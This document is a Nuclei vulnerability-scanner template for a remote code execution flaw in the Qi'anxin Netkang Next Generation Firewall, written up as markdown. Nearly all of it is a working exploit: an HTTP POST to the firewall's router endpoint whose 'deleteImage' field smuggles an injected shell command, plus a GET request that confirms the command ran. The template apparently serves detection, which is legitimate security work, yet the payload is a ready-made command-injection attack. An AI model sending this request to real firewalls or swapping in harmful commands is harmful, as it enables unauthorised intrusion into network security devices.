# Nuclei Template: Qi'anxin Netkang Next Generation Firewall - Remote Code Execution
**Template ID:** qi-anxin-netkang-next-generation-firewall-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`qi-anxin-netkang-next-generation-firewall-rce.yaml`)

## Vulnerability Information & PoC

## Description
Qi'anxin Netkang Next Generation Firewall is susceptible to remote code execution.

## Steps to reproduce / Exploit Payload
```http
POST /directdata/direct/router HTTP/1.1
Host: {{Hostname}}

{"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;touch /var/www/html/{{randstr}}.txt"]}],"type":"rpc","tid":17,"f8839p7rqtj":"="}

GET /{{randstr}}.txt HTTP/1.1
Host: {{Hostname}}
```

## References
- https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
